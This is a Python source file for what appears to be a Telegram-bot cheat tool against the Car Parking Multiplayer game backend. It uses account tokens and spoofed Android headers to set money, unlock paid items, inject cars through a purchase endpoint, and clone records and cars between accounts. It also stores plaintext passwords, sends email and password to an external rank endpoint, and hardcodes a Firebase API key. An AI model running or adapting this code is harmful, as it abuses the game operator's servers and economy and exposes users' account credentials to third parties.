    async def _send(self, auth, record, fuid, original=None):
        if not fuid: return False,"NO_UID"
        try:
            payload = build_payload(record, fuid, original)
            r = await self._post(SAVE_URL,
                {"data":{"data":payload,"deviceId":fuid[:8]}},
                {**GAME_HEADERS,"Authorization":f"Bearer {auth}","Connection":"Keep-Alive",
                 "User-Agent":"Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SD1A.210817.036)"})
            if r and self._ok(r): return True,"OK"
            return False,f"SAVE_FAILED: {str(r)[:100]}"
        except Exception as e: return False,str(e)

    async def _save(self, uid, data):
        ok, msg, auth = await self.get_auth(uid)
        if not ok:
            return {"ok": False, "message": msg}

        td = self.get_token_data(uid) or {}
        fuid = td.get("firebase_uid", "")
        email = td.get("email", "")
        original = self.get_record(uid, email) or None

        try:
            if not fuid:
                return {"ok": False, "message": "FIREBASE_UID_MISSING"}

            payload = build_payload(data, fuid, original)
            result = await self._post(
                SAVE_URL,
                {"data": {"data": payload, "deviceId": fuid[:8]}},
                {**GAME_HEADERS,
                 "Authorization": f"Bearer {auth}",
                 "Connection": "Keep-Alive",
                 "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SD1A.210817.036)"}
            )

            if result and self._ok(result):
                self.set_record(uid, data, email)
                return {"ok": True}

            return {"ok": False, "message": f"SAVE_FAILED: {str(result)[:300]}"}
        except Exception as e:
            log.exception("Save error")
            return {"ok": False, "message": str(e)}

    async def _modify(self, uid, mods):
        await self.load(uid)
        td    = self.get_token_data(uid)
        email = td.get("email") if td else None
        d     = deepcopy(self.get_record(uid,email))
        if not d or not d.get("Name"):
            return {"ok":False,"message":"Could not load account data. Try Refresh first."}
        for k,v in mods.items():
            if k=="money": v=min(v,MAX_MONEY)
            if k=="coin":  v=min(v,MAX_COIN)
            d[k]=v
        return await self._save(uid,d)

    async def _set_floats(self, uid, indices_values):
        await self.load(uid)
        td    = self.get_token_data(uid)
        email = td.get("email") if td else None
        d     = deepcopy(self.get_record(uid,email))
        if not d or not d.get("Name"):
            return {"ok":False,"message":"Could not load account data. Try Refresh first."}
        fl = d.get("floats",[])
        max_idx = max(idx for idx,_ in indices_values)
        while len(fl) <= max_idx: fl.append(0.0)
        for idx,val in indices_values: fl[idx]=float(val)
        d["floats"]=fl
        return await self._save(uid,d)

    async def _set_integers(self, uid, indices_values):
        await self.load(uid)
        td    = self.get_token_data(uid)
        email = td.get("email") if td else None
        d     = deepcopy(self.get_record(uid,email))
        if not d or not d.get("Name"):
            return {"ok":False,"message":"Could not load account data. Try Refresh first."}
        it = d.get("integers",[])
        max_idx = max(idx for idx,_ in indices_values)
        while len(it) <= max_idx: it.append(0)
        for idx,val in indices_values: it[idx]=int(val)
        d["integers"]=it
        return await self._save(uid,d)

    # ── Game operations ───────────────────
    async def set_money(self, uid, amount):
        return await self._modify(uid, {"money": min(amount, MAX_MONEY)})

    async def set_coin(self, uid, amount):
        return await self._modify(uid, {"coin": min(amount, MAX_COIN)})

    async def set_player_name(self, uid, name):
        return await self._modify(uid, {"Name": name})

    async def set_player_id(self, uid, pid):
        return await self._modify(uid, {"localID": pid.upper()})

    async def set_race_wins(self, uid, amount):
        return await self._set_floats(uid, [(8, float(amount))])

    async def set_race_loses(self, uid, amount):
        return await self._set_floats(uid, [(9, float(amount))])

    async def unlock_w16(self, uid):
        return await self._set_floats(uid, [(32, 1.0)])
        
    async def unlock_sirens(self, uid):
        await self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        d = deepcopy(self.get_record(uid, email))

        if not d or not d.get("Name"):
            return {"ok": False, "message": "Could not load account data."}

        lights = list(d.get("boughtPoliceLights") or [])
        sirens = list(d.get("boughtPoliceSirens") or [])

        for x in [0, 1, 2, 3, 4, 7, 9, 447]:
            if x not in lights:
                lights.append(x)

        if 511 not in sirens:
            sirens.append(511)

        d["boughtPoliceLights"] = lights
        d["boughtPoliceSirens"] = sirens

        # IMPORTANT: use the same authenticated partial-save path as the
        # supplied working Python implementation.
        return await self._save(uid, d)

    async def unlock_horns(self, uid):
        return await self._set_floats(uid, [(27,1.0),(28,1.0),(29,1.0),(30,1.0),(31,1.0)])

    async def disable_damage(self, uid):
        return await self._set_floats(uid, [(34, 1.0)])

    async def unlimited_fuel(self, uid):
        return await self._set_floats(uid, [(3, 1.0)])

    async def unlock_smoke(self, uid):
        return await self._set_floats(uid, [(33, 1.0)])

    async def unlock_animations(self, uid):
        await self.load(uid)
        td    = self.get_token_data(uid)
        email = td.get("email") if td else None
        d     = deepcopy(self.get_record(uid,email))
        if not d or not d.get("Name"):
            return {"ok":False,"message":"Could not load account data."}
        d["animations"] = list(set(d.get("animations",[]) + list(range(301))))
        return await self._save(uid,d)

    async def unlock_wheels(self, uid):
        await self.load(uid)
        td    = self.get_token_data(uid)
        email = td.get("email") if td else None
        d     = deepcopy(self.get_record(uid,email))
        if not d or not d.get("Name"):
            return {"ok":False,"message":"Could not load account data."}
        d["wheels"] = list(set(d.get("wheels",[]) + list(range(73,221))))
        it = d.get("integers",[])
        while len(it) < 113: it.append(0)
        for i in [0,1,2,3,4,5,110,111,112]: it[i]=1
        d["integers"]=it
        return await self._save(uid,d)

    async def unlock_headlights(self, uid):
        """Unlock headlights and persist the change to the CPM account."""
        await self.load(uid)
        td = self.get_token_data(uid) or {}
        email = td.get("email")
        current = deepcopy(self.get_record(uid, email))

        if not current or not current.get("Name"):
            return {"ok": False, "message": "Could not load account data."}

        floats = list(current.get("floats") or [])
        while len(floats) <= 35:
            floats.append(0.0)

        # Headlights feature flag.
        floats[35] = 1.0
        current["floats"] = floats

        saved = await self._save(uid, current)
        if not saved.get("ok"):
            return saved

        # Confirm the change came back from the server before reporting success.
        if not await self.load(uid, force=True):
            return {"ok": False, "message": "HEADLIGHTS_VERIFY_LOAD_FAILED"}
        fresh = self.get_record(uid, email) or {}
        vals = fresh.get("floats") or []
        if len(vals) <= 35 or float(vals[35]) < 1.0:
            return {"ok": False, "message": "HEADLIGHTS_VERIFY_FAILED"}
        return {"ok": True, "message": "Headlights saved and verified."}

    async def unlock_all_clothes(self, uid):
        """Unlock all clothes using the category-based equipment format."""
        await self.load(uid, force=True)

        td = self.get_token_data(uid) or {}
        email = td.get("email", "")
        current = deepcopy(self.get_record(uid, email))

        if not current or not current.get("Name"):
            return {
                "ok": False,
                "message": "Could not load account data. Try Refresh first."
            }

        categories = (
            "hair", "face", "beard", "cap", "mask",
            "top", "gloves", "bag", "pants", "shoes", "glasses"
        )

        clothing_ids = set(range(1, 200))

        def normalize_equipment(equip, gender):
            if not isinstance(equip, dict):
                equip = {}

            out = deepcopy(equip)

            for category in categories:
                existing = out.get(category, [])
                if not isinstance(existing, list):
                    existing = []

                cleaned = set()
                for value in existing:
                    try:
                        cleaned.add(int(value))
                    except (TypeError, ValueError):
                        continue

                cleaned.update(clothing_ids)
                out[category] = sorted(cleaned)

            if not isinstance(out.get("SelectedEquipments"), list):
                out["SelectedEquipments"] = []

            try:
                out["Gender"] = int(out.get("Gender", gender))
            except (TypeError, ValueError):
                out["Gender"] = gender

            return out

        current["personEquipmentsMale"] = normalize_equipment(
            current.get("personEquipmentsMale"), 0
        )
        current["personEquipmentsFemale"] = normalize_equipment(
            current.get("personEquipmentsFemale"), 1
        )

        # IMPORTANT: this is the same partial-save route used by the supplied
        # Python source. Do not use the native full-record endpoint here.
        saved = await self._save(uid, current)
        if not saved.get("ok"):
            return saved

        # Verify what the CPM load endpoint returns.
        if not await self.load(uid, force=True):
            return {
                "ok": False,
                "message": "ALL_CLOTHES_VERIFY_LOAD_FAILED"
            }

        fresh = self.get_record(uid, email) or {}

        for key in ("personEquipmentsMale", "personEquipmentsFemale"):
            equip = fresh.get(key)
            if not isinstance(equip, dict):
                return {
                    "ok": False,
                    "message": f"ALL_CLOTHES_VERIFY_FAILED:{key}:INVALID_FORMAT"
                }

            for category in categories:
                values = equip.get(category)
                if not isinstance(values, list):
                    return {
                        "ok": False,
                        "message": f"ALL_CLOTHES_VERIFY_FAILED:{key}:{category}"
                    }

                try:
                    ids = {int(v) for v in values}
                except (TypeError, ValueError):
                    return {
                        "ok": False,
                        "message": f"ALL_CLOTHES_VERIFY_FAILED:{key}:{category}"
                    }

                missing = sorted(clothing_ids - ids)
                if missing:
                    return {
                        "ok": False,
                        "message": (
                            f"ALL_CLOTHES_VERIFY_FAILED:{key}:{category}:"
                            f"MISSING_{len(missing)}"
                        )
                    }

        return {
            "ok": True,
            "message": "All Clothes saved and verified."
        }

    async def unlock_houses(self, uid):

        return await self._set_integers(uid, [(8,1),(110,1),(111,1),(112,1)])

    async def complete_all_levels(self, uid):
        lvl = [0] + [120 if i==43 else 1 for i in range(1,110)]
        return await self._modify(uid, {"LevelsDoneTime": lvl})

    async def set_rank(self, uid: int) -> Dict[str, Any]:
        await self.load(uid, force=True)
        td = self.get_token_data(uid)
        if not td:
            return {"ok": False, "message": "Token data not found"}
            
        email = td.get("email")
        password = td.get("password")
        
        if not email or not password:
            return {"ok": False, "message": "Email or password not found in session"}
        
        # Payload persis seperti skrip contoh YTCATHACK
        payload = {
            "email": email, 
            "password": password
        }
        
        headers = {
            "Content-Type": "application/json"
        }
        
        try:
            # Mengirim POST request ke RANK_URL
            r = await self._post(RANK_URL, payload, headers)
            
            # Cek apakah server memberikan respons
            if not r:
                return {"ok": False, "message": "RANK_FAILED: Server returned no response (Offline/Timeout)"}
            
            # Memeriksa respons status code atau isi teks respons dari server
            # Jika _post mengembalikan objek requests.Response atau dict hasil json
            status_code = getattr(r, "status_code", 200)
            text_resp = getattr(r, "text", str(r))
            
            if status_code == 200 or (isinstance(r, dict) and (r.get("ok") or r.get("success"))):
                return {"ok": True, "message": "Crown Rank completed! Please check in-game."}
            else:
                return {"ok": False, "message": f"RANK_FAILED (HTTP {status_code}): {text_resp[:50]}"}
                
        except Exception as e:
            return {"ok": False, "message": f"RANK_ERROR: {str(e)[:50]}"}

    async def change_email(self, uid: int, new_email: str) -> Dict[str, Any]:
        await self.load(uid, force=True)
        td = self.get_token_data(uid)
        if not td:
            return {"ok": False, "message": "Token data not found"}
        old_email = td.get("email")
        password = td.get("password")
        if not password:
            return {"ok": False, "message": "Password not found"}
        try:
            login_result = await self.login(old_email, password)
            if not login_result.get("ok"):
                return {"ok": False, "message": "Failed to login with old credentials"}
            url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={FK}"
            payload = {
                "idToken": login_result["auth"],
                "email": new_email,
                "returnSecureToken": True
            }
            result = await self._post(url, payload, {})
            if result and result.get("email"):
                self.save_token(
                    uid,
                    result.get("idToken", login_result["auth"]),
                    new_email,
                    password,
                    result.get("refreshToken", login_result.get("refresh_token", "")),
                    result.get("localId", td.get("firebase_uid", ""))
                )
                return {"ok": True, "message": f"Email changed to {new_email}"}
            else:
                return {"ok": False, "message": "Failed to change email"}
        except Exception as e:
            return {"ok": False, "message": str(e)}

    async def change_password(self, uid: int, new_password: str) -> Dict[str, Any]:
        await self.load(uid, force=True)
        td = self.get_token_data(uid)
        if not td:
            return {"ok": False, "message": "Token data not found"}
        email = td.get("email")
        old_password = td.get("password")
        if not email or not old_password:
            return {"ok": False, "message": "Email or password not found"}
        try:
            login_result = await self.login(email, old_password)
            if not login_result.get("ok"):
                return {"ok": False, "message": "Failed to login with old credentials"}
            url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={FK}"
            payload = {
                "idToken": login_result["auth"],
                "password": new_password,
                "returnSecureToken": True
            }
            result = await self._post(url, payload, {})
            if result and result.get("idToken"):
                self.save_token(
                    uid,
                    result["idToken"],
                    email,
                    new_password,
                    result.get("refreshToken", login_result.get("refresh_token", "")),
                    result.get("localId", td.get("firebase_uid", ""))
                )
                return {"ok": True, "message": "Password changed successfully"}
            else:
                return {"ok": False, "message": "Failed to change password"}
        except Exception as e:
            return {"ok": False, "message": str(e)}

    async def clone_account(self, source_uid, target_email, target_password):
        target_email = (target_email or "").strip()
        if not target_email or len(target_password or "") < 6:
            return {"ok":False,"message":"TARGET_EMAIL_OR_PASSWORD_INVALID"}
        source_td = self.get_token_data(source_uid)
        if not source_td:
            return {"ok":False,"message":"SOURCE_NOT_LOGGED_IN"}
        await self.load(source_uid, force=True)
        source_record = deepcopy(self.get_record(source_uid, source_td.get("email","")))
        if not source_record or not source_record.get("Name"):
            return {"ok":False,"message":"SOURCE_RECORD_NOT_AVAILABLE"}
        target_login = await self.login(target_email, target_password)
        if not target_login.get("ok"):
            return {"ok":False,"message":target_login.get("message","TARGET_LOGIN_FAILED")}
        target_fuid = target_login.get("firebase_uid","")
        if not target_fuid:
            return {"ok":False,"message":"TARGET_FIREBASE_UID_MISSING"}
        ok, msg = await self._send(target_login["auth"], source_record, target_fuid, None)
        if not ok:
            return {"ok":False,"message":msg}
        self.save_token(-abs(int(source_uid)), target_login["auth"], target_email, target_password, target_login.get("refresh_token", ""), target_fuid)
        self.set_record(-abs(int(source_uid)), source_record, target_email)
        return {"ok": True, "message": "Account cloned successfully"}


    async def fix_account(self, uid):
        await self.load(uid)
        td    = self.get_token_data(uid)
        email = td.get("email") if td else None
        d     = deepcopy(self.get_record(uid,email))
        if not d or not d.get("Name"):
            return {"ok":False,"message":"Could not load account data."}
        bugs=0
        fl = (d.get("floats",[]))[:54]
        while len(fl)<54: fl.append(0.0)
        fixed_fl=[]
        for v in fl:
            if v in (1,1.0): fixed_fl.append(1.0)
            elif isinstance(v,(int,float)) and v>1: bugs+=1; fixed_fl.append(0.0)
            else: fixed_fl.append(float(v) if v else 0.0)
        it = (d.get("integers",[]))[:120]
        while len(it)<120: it.append(0)
        fixed_it=[]
        for v in it:
            if v==1: fixed_it.append(1)
            elif isinstance(v,(int,float)) and v>1: bugs+=1; fixed_it.append(0)
            else: fixed_it.append(int(v) if v else 0)
        d["floats"]=fixed_fl; d["integers"]=fixed_it
        result = await self._save(uid,d)
        return {"ok":True,"bugs_fixed":bugs} if result.get("ok") else {"ok":False,"message":"FIX_FAILED"}


# ═══════════════════════════════════════════
#  🚗 CPM1 CLONE / INJECT / UNLOCK CARS
# ═══════════════════════════════════════════

_CPM1_FB_KEY = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
SOURCE_ACCOUNT = (os.getenv("UNLOCK_SOURCE_EMAIL", "").strip(), os.getenv("UNLOCK_SOURCE_PASSWORD", ""))


def verify_user(email, password):
    payload = {
        "email": email,
        "password": password,
        "returnSecureToken": True,
        "clientType": "CLIENT_TYPE_ANDROID",
    }
    try:
        response = _req_cars.post(
            "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword",
            json=payload,
            params={"key": _CPM1_FB_KEY},
            timeout=30,
        )
        if response.status_code == 200:
            d = response.json()
            return d.get("idToken"), d.get("localId")
        return None, None
    except Exception:
        return None, None


def cpm1_api(token, endpoint, data=None):
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}",
    }
    try:
        response = _req_cars.post(
            f"https://europe-west1-cp-multiplayer.cloudfunctions.net/{endpoint}",
            json={"data": data},
            headers=headers,
            timeout=60,
        )
        return response.status_code, response.text
    except Exception:
        return 500, json.dumps({"result": "error"})


def cpm1_get_full_account_record(token, firebase_uid, password, email):
    """Fetch and decode the complete CPM player record for an authenticated source account."""
    try:
        status, text = cpm1_api(token, "GetPlayerRecords3", None)
        if status != 200:
            return None, f"LOAD_HTTP_{status}"
        raw = json.loads(text)
        encoded = raw.get("result")
        if not encoded:
            return None, "LOAD_NO_RESULT"
        decoded = decrypt_player_record(encoded, str(firebase_uid), password, email)
        if not decoded.get("success") or not isinstance(decoded.get("record"), dict):
            return None, decoded.get("message", "DECRYPT_FAILED")
        return decoded["record"], None
    except Exception as e:
        return None, f"LOAD_ERROR:{e}"


def cpm1_native_full_save(token, firebase_uid, password, email, record):
    """Write a complete player record to the authenticated target account."""
    try:
        raw = native_serialize_player(record)
        if not raw:
            return False, "SERIALIZE_FAILED"
        compressed = zlib.compress(raw)
        payload = {
            "uid": str(firebase_uid),
            "password": password or "",
            "email": email or "",
            "fk": FK,
            "base64": base64.b64encode(compressed).decode("ascii"),
        }
        # This endpoint accepts the native full-record shape rather than the
        # bearer-token partial-save shape. The account credentials belong to
        # the account owner and are used only for the requested migration.
        r = _req_cars.post(SAVE_URL, json=payload, headers=GAME_HEADERS, timeout=90)
        try:
            result = r.json()
        except Exception:
            result = {"raw": r.text}
        if r.status_code != 200:
            return False, f"FULL_SAVE_HTTP_{r.status_code}"
        if isinstance(result, dict):
            if result.get("error"):
                return False, f"FULL_SAVE_FAILED:{result.get('error')}"
            inner = result.get("result")
            if inner in (0, "0", False):
                return False, "FULL_SAVE_REJECTED"
        return True, "OK"
    except Exception as e:
        return False, f"FULL_SAVE_ERROR:{e}"


def cpm1_clone_record_for_target(source_record, target_uid, target_record=None):
    """Prepare a source record for target ownership while preserving TARGET-only fields."""
    record = deepcopy(source_record) if isinstance(source_record, dict) else {}
    target_record = target_record if isinstance(target_record, dict) else {}

    # Identity and friends remain target-owned. They are still serialized in
    # their required native positions so the record layout stays valid.
    record["localID"] = str(target_uid)
    record["FriendsID"] = deepcopy(target_record.get("FriendsID", []))
    return record


def cpm1_record_diff(source, target):
    """Return meaningful source/target differences, ignoring target identity."""
    ignored = {"localID", "FriendsID"}
    diffs = []
    keys = sorted(set(source or {}) | set(target or {}))
    for key in keys:
        if key in ignored:
            continue
        a, b = (source or {}).get(key), (target or {}).get(key)
        if json.dumps(a, sort_keys=True, ensure_ascii=False, default=str) != json.dumps(b, sort_keys=True, ensure_ascii=False, default=str):
            diffs.append(key)
    return diffs


def cpm1_get_cars(token):
    status, text = cpm1_api(token, "GetAllCars2", None)
    if status != 200:
        return None
    try:
        result = json.loads(json.loads(text)["result"])
        return result if isinstance(result, list) else None
    except Exception:
        return None


def cpm1_get_garage_slot(token):
    for attempt in range(5):
        try:
            status, text = cpm1_api(token, "WSGetCarListV3", 20)
            if status == 200:
                try:
                    data = json.loads(text)
                    result = json.loads(data["result"])
                    if result and isinstance(result, list) and len(result) > 0:
                        for slot in result:
                            if isinstance(slot, dict) and slot.get("carID", 0) == 0:
                                return slot
                        return None
                except Exception:
                    pass
        except Exception:
            pass
        time.sleep(0.5)
    try:
        status, text = cpm1_api(token, "WSGetCarListV3", 20)
        if status == 200:
            try:
                data = json.loads(text)
                result = json.loads(data["result"])
                if result and isinstance(result, list) and len(result) > 0:
                    for slot in result:
                        if isinstance(slot, dict) and slot.get("carID", 0) == 0:
                            return slot
                    return None
            except Exception:
                pass
    except Exception:
        pass
    return None


def cpm1_get_full_car(token, car_data):
    cid = car_data.get("CarID") or car_data.get("carID") or 0
    gen = car_data.get("carGeneratedID") or car_data.get("CarGeneratedID") or ""
    for endpoint, data in (
        ("WSGetFullCarV3", json.dumps({"CarID": cid, "carGeneratedID": gen})),
        ("WSGetFullCarV3", json.dumps(car_data)),
        ("WSGetFullCarV3", cid),
        ("TestGetAllCars", None),
    ):
        try:
            status, text = cpm1_api(token, endpoint, data)
            if status != 200:
                continue
            raw = json.loads(text)
            result = raw.get("result", raw)
            if isinstance(result, str):
                try:
                    result = json.loads(result)
                except Exception:
                    pass
            if isinstance(result, dict) and (result.get("CarID") or result.get("carID")):
                return result
            if isinstance(result, list) and result:
                for item in result:
                    if not isinstance(item, dict):
                        continue
                    if item.get("CarID") == cid or item.get("carID") == cid:
                        return item
        except Exception:
            continue
    return None


def cpm1_fix_car_appearance(car):
    if not isinstance(car, dict):
        return car
    car = json.loads(json.dumps(car))
    vyn = car.get("Vynils")
    if not isinstance(vyn, dict):
        vyn = {}
    if "CarID" not in vyn and car.get("CarID") is not None:
        vyn["CarID"] = car.get("CarID")
    car["Vynils"] = vyn

    def ensure_color_list(key, length, default=1.0):
        val = car.get(key)
        if not isinstance(val, list) or len(val) == 0:
            car[key] = [float(default)] * length
        else:
            fixed = []
            for x in val:
                try:
                    fx = float(x)
                except Exception:
                    fx = default
                if fx == 0.0:
                    fx = 0.15
                fixed.append(fx)
            car[key] = fixed

    for key, ln in (("colors", 4), ("Colors", 4), ("bodyColor", 4), ("paint", 4)):
        if key in car or key in ("colors", "Colors"):
            ensure_color_list(key, ln, 0.85)
    if isinstance(car.get("color"), (int, float)) and float(car.get("color") or 0) == 0:
        car["color"] = 1
    car["police"] = True if car.get("police") is None else car.get("police")
    car["isLocked"] = False
    if car.get("engineID") in (None, 0):
        car["engineID"] = 5
    car["cdi"] = True
    car["torque"] = car.get("torque") or 3000.0
    car["brake"] = car.get("brake") or 3000.0
    car["mass"] = car.get("mass") or 1100.0
    return car


def cpm1_clone_car(token_target, car_data, target_uid, token_source=None):
    cid = car_data.get("CarID", 0) or car_data.get("carID", 0)
    full = None
    if token_source:
        try:
            full = cpm1_get_full_car(token_source, car_data)
        except Exception:
            full = None
    base = full if isinstance(full, dict) else car_data
    car = cpm1_fix_car_appearance(base)
    car["CarID"] = cid
    try:
        if "texts" in car and isinstance(car["texts"], list) and len(car["texts"]) > 2:
            car["texts"][2] = f"{str(target_uid)[:8].upper()}_{cid}_HZ"
        elif "texts" in car and isinstance(car["texts"], str):
            car["texts"] = ["", "", f"{str(target_uid)[:8].upper()}_{cid}_HZ"]
    except Exception:
        pass
    try:
        if isinstance(car.get("Vynils"), dict):
            car["Vynils"]["CarID"] = cid
    except Exception:
        pass
    slot = cpm1_get_garage_slot(token_target)
    if not slot:
        return False
    vynil = car.get("Vynils") if isinstance(car.get("Vynils"), dict) else {}
    if not vynil:
        vynil = {"CarID": cid}
    payload = {
        "ownerID": slot.get("ownerID", ""),
        "ownerName": slot.get("ownerName", ""),
        "description": slot.get("description", ""),
        "CarID": slot.get("carID", 0),
        "carGeneratedID": slot.get("carGeneratedID", ""),
        "ownerAccountID": slot.get("ownerAccountID", ""),
        "oneCar": car,
        "vynilOneCar": vynil,
        "loadedLocalCar": {"instanceID": _rnd_cars.randint(-999999, -100000)},
        "price": slot.get("price", 100),
        "SellingCar": {},
        "willReject": False,
        "dislike": 1,
        "like": 0,
        "liked": False,
        "disliked": False,
        "mode": 1,
    }
    status, text = cpm1_api(token_target, "WSPurchaseCarV3", json.dumps(payload))
    try:
        if status == 200 and str(json.loads(text).get("result")) in ("1", 1):
            return True
    except Exception:
        pass
    return False


def cpm1_get_injection_slot(token):
    """Choose an empty garage slot, falling back to the first returned slot."""
    for _ in range(5):
        try:
            status, text = cpm1_api(token, "WSGetCarListV3", 20)
            if status == 200:
                data = json.loads(text)
                result = data.get("result")
                if isinstance(result, str):
                    result = json.loads(result)
                if isinstance(result, list):
                    slots = [slot for slot in result if isinstance(slot, dict)]
                    if slots:
                        return next((slot for slot in slots if slot.get("carID", 0) == 0), slots[0])
        except Exception:
            pass
        time.sleep(0.5)
    return None


def cpm1_inject_car_from_source(source_token, target_token, target_uid, requested_car_id):
    """Inject one requested model, report the game API reply, then verify the garage."""
    requested_car_id = int(requested_car_id)
    target_cars_before = cpm1_get_cars(target_token)
    if target_cars_before is None:
        return {"ok": False, "message": "TARGET_GARAGE_READ_FAILED"}

    def count_requested_model(cars):
        count = 0
        for item in cars or []:
            if not isinstance(item, dict):
                continue
            value = item.get("CarID", item.get("carID"))
            try:
                if int(value or 0) == requested_car_id:
                    count += 1
            except (TypeError, ValueError):
                continue
        return count

    before_count = count_requested_model(target_cars_before)
    source_cars = cpm1_get_cars(source_token) or []
    source_cars = [car for car in source_cars if isinstance(car, dict)]
    if not source_cars:
        return {"ok": False, "message": "SOURCE_CARS_UNAVAILABLE"}

    def source_car_id(car):
        try:
            return int(car.get("CarID", car.get("carID", 0)) or 0)
        except (TypeError, ValueError):
            return 0

    car = deepcopy(max(source_cars, key=source_car_id))
    car["CarID"] = requested_car_id
    if isinstance(car.get("Vynils"), dict):
        car["Vynils"]["CarID"] = requested_car_id

    slot = cpm1_get_injection_slot(target_token)
    if not slot:
        return {"ok": False, "message": "TARGET_GARAGE_SLOT_UNAVAILABLE"}

    vinyl = car.get("Vynils") if isinstance(car.get("Vynils"), dict) else {"CarID": requested_car_id}
    payload = {
        "ownerID": slot.get("ownerID", ""),
        "ownerName": slot.get("ownerName", ""),
        "description": slot.get("description", ""),
        "CarID": slot.get("carID", 0),
        "carGeneratedID": slot.get("carGeneratedID", ""),
        "ownerAccountID": slot.get("ownerAccountID", ""),
        "oneCar": car,
        "vynilOneCar": vinyl,
        "loadedLocalCar": {"instanceID": _rnd_cars.randint(-999999, -100000)},
        "price": slot.get("price", 100),
        "SellingCar": {},
        "willReject": False,
        "dislike": 1,
        "like": 0,
        "liked": False,
        "disliked": False,
        "mode": 1,
    }
    status, response_text = cpm1_api(target_token, "WSPurchaseCarV3", json.dumps(payload))
    try:
        server_payload = json.loads(response_text)
    except (TypeError, ValueError):
        server_payload = None

    server_result = server_payload.get("result") if isinstance(server_payload, dict) else None
    server_message = None
    if isinstance(server_payload, dict):
        server_message = server_payload.get("message") or server_payload.get("error")
    server_debug = {
        "server_http_status": status,
        "server_result": server_result,
        "server_message": server_message,
        "server_response_preview": str(response_text)[:1200],
    }
    accepted = status == 200 and str(server_result) == "1"
    if not accepted:
        return {
            "ok": False,
            "message": "CAR_INJECTION_FAILED",
            "garage_verified": False,
            **server_debug,
        }

    # The game can acknowledge the request before its garage list is updated.
    # Poll the target, but never repeat the purchase request.
    for _ in range(12):
        time.sleep(1)
        target_cars_after = cpm1_get_cars(target_token)
        if target_cars_after is not None and count_requested_model(target_cars_after) > before_count:
            return {
                "ok": True,
                "message": "CUSTOM_CAR_INJECTED",
                "car_id": requested_car_id,
                "garage_verified": True,
                **server_debug,
            }

    return {
        "ok": False,
        "message": "SERVER_ACCEPTED_BUT_CAR_NOT_FOUND_IN_TARGET_GARAGE",
        "car_id": requested_car_id,
        "garage_verified": False,
        **server_debug,
    }

def _car_key(car):
    if not isinstance(car, dict):
        return None
    cid = car.get("CarID") or car.get("carID")
    gen = car.get("carGeneratedID") or car.get("CarGeneratedID") or ""
    if cid in (None, "", 0) and not gen:
        return None
    return (str(cid), str(gen))


def _target_contains_source_car(target_cars, source_car):
    """Check whether a source car is already present on TARGET after a retry."""
    sk = _car_key(source_car)
    if sk is None:
        return False
    sid, sgen = sk
    for car in target_cars or []:
        tk = _car_key(car)
        if tk == sk:
            return True
        # Some server responses regenerate the generated ID but preserve CarID.
        if tk and tk[0] == sid:
            return True
    return False


async def cpm1_clone_all_cars_strict(source_token, target_token, target_uid,
                                      max_retries=3, retry_delay=1.0, progress_message=None):
    """Use the source file's WSPurchaseCarV3 mechanism, but verify every car on TARGET."""
    source_cars = await asyncio.to_thread(cpm1_get_cars, source_token) or []
    source_cars = [c for c in source_cars if isinstance(c, dict)]
    target_cars = await asyncio.to_thread(cpm1_get_cars, target_token) or []
    total = len(source_cars)
    report = {"source_total": total, "target_before": len(target_cars), "success": 0,
              "failed": [], "retries": {}, "complete": False}

    async def update(index, car_key, state, attempt):
        if progress_message is None: return
        width = 24
        done = int(width * index / max(total, 1))
        bar = "█" * done + "░" * (width-done)
        try:
            await progress_message.edit_text(
                f"🚗 **CLONE MOBIL**\n\n`{bar}` **{int(index*100/max(total,1))}%**\n"
                f"📦 Progress: **{index}/{total}**\n🚘 Car: `{car_key}`\n"
                f"🔄 Attempt: **{attempt}/{max_retries}**\n📌 **{state}**\n\n"
                f"✅ Verified: **{report['success']}**\n❌ Failed: **{len(report['failed'])}**",
                parse_mode="Markdown")
        except Exception:
            pass

    for index, source_car in enumerate(source_cars, 1):
        key = _car_key(source_car) or (f"index:{index}", "")
        key_text = f"{key[0]}:{key[1]}"
        success = _target_contains_source_car(target_cars, source_car)
        attempts = 0
        last_error = ""
        if success:
            report["success"] += 1
            report["retries"][key_text] = 0
            await update(index, key_text, "ALREADY VERIFIED ✅", 0)
            continue
        while not success and attempts < max(1, int(max_retries)):
            attempts += 1
            await update(index-1, key_text, "CLONING", attempts)
            try:
                ok = await asyncio.to_thread(cpm1_clone_car, target_token, source_car, target_uid, source_token)
                await asyncio.sleep(0.4)
                target_cars = await asyncio.to_thread(cpm1_get_cars, target_token) or []
                # IMPORTANT: API success alone is not enough; target presence is required.
                success = _target_contains_source_car(target_cars, source_car)
                if not success:
                    last_error = "SERVER_ACCEPTED_BUT_TARGET_VERIFICATION_FAILED" if ok else "WSPurchaseCarV3_FAILED"
            except Exception as exc:
                last_error = f"{type(exc).__name__}:{exc}"
            if not success and attempts < max_retries:
                await update(index-1, key_text, "RETRY", attempts)
                await asyncio.sleep(retry_delay * attempts)
        report["retries"][key_text] = attempts
        if success:
            report["success"] += 1
            await update(index, key_text, "VERIFIED ✅", attempts)
        else:
            report["failed"].append({"index": index, "car_key": key_text, "error": last_error or "CLONE_FAILED"})
            await update(index, key_text, "FAILED ❌", attempts)

    target_cars = await asyncio.to_thread(cpm1_get_cars, target_token) or []
    missing = [{"index": i, "car_key": f"{(_car_key(c) or ('unknown',''))[0]}:{(_car_key(c) or ('',''))[1]}"}
               for i,c in enumerate(source_cars,1) if not _target_contains_source_car(target_cars,c)]
    report["target_after"] = len(target_cars)
    report["missing_after_verify"] = missing
    report["complete"] = (total == report["success"] and not missing)
    return report


async def cpm1_clone_account(source_email, source_pass, target_email, target_pass, progress_message=None):
    source_token, source_uid = await asyncio.to_thread(verify_user, source_email, source_pass)
    if not source_token:
        return False, {"error": "Failed to login to source"}
    target_token, target_uid = await asyncio.to_thread(verify_user, target_email, target_pass)
    if not target_token:
        return False, {"error": "Failed to login to target"}
    report = await cpm1_clone_all_cars_strict(source_token, target_token, target_uid, 3, 1.0, progress_message)
    return bool(report.get("complete")), report





# =========================
# CPM WEB API
# =========================

nuker = CPMNuker()

WEB_SESSIONS = {}
SESSION_UIDS = {}
